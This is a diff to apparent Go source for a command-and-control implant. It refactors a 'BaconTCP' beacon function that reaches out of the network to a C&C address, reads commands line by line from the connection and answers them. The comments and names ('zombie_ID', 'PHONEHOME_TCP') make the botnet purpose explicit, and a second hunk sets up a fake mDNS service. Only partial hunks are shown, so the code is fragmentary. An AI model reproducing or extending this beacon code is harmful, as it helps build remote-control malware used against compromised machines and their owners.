@@ -19,16 +19,17 @@ import (
 	"github.com/hashicorp/mdns"
 )
 
-// Beacons
 // TODO: "strange" ways of reaching out
-// makes requests outside the network to get to the C&C
 
-//used for reaching out with regular TCP connection, this will hand off to regular connection
+// Beacons
+
+// makes requests outside the network to get to the C&C
+// command_tcpaddr is an ip:port as string for TCP connections
 // if a "good password *HINT*" is provided
-// put the id of the entity connecting to let the host know it's us
-func BaconTCP(zombie_ID string) {
+// has a return code to process: 0 means an error, 1 means success
+func BaconTCP(command_tcpaddr string) (return_code int, derp error) {
 	// Have to cast the string to a net.IP type
-	Core.PHONEHOME_TCP.IP = net.IP(Core.Remote_tcpaddr)
+	Core.PHONEHOME_TCP.IP = net.IP(command_tcpaddr)
 	// the network functions return two objects
 	// a connection
 	// and an error
@@ -49,17 +50,19 @@ func BaconTCP(zombie_ID string) {
 	// to enact on BEACON!
 	// TODO: code C&C to pool callbacks into a list
 	for {
+		// for every line of input from tcp stream
 		netData, derp := bufio.NewReader(connection).ReadString('\n')
+		// if there is an error
 		if derp != nil {
 			// print the error
 			ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
-			return
+			return 0, derp // error code : potato
 		}
 		json_from_command, derp := json.Marshal(netData)
 		if derp != nil {
 			// print the error
 			ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
-			return
+			return 0, derp
 		}
 		beacon_reply := Core.BeaconResponse{
 			Authstring: string(json_from_command),
@@ -149,9 +152,9 @@ func StartMdnsReceiver(service_name string, false_service_struct Core.FakeMDNSSe
 	service, _ := mdns.NewMDNSService(host, "_foobar._tcp", "", "", 8000, nil, info)
 	// assign to struct
 	fake_mdns_service := Core.FakeMDNSService{}
-	fake_mdns_service.host = host
-	fake_mdns_service.info = info[0]
-	fake_mdns_service.service = *service
+	fake_mdns_service.Host = host
+	fake_mdns_service.Info = info[0]
+	fake_mdns_service.Service = *service
 
 	// Create the mDNS server, defer shutdown
 	server, _ := mdns.NewServer(&mdns.Config{Zone: service})
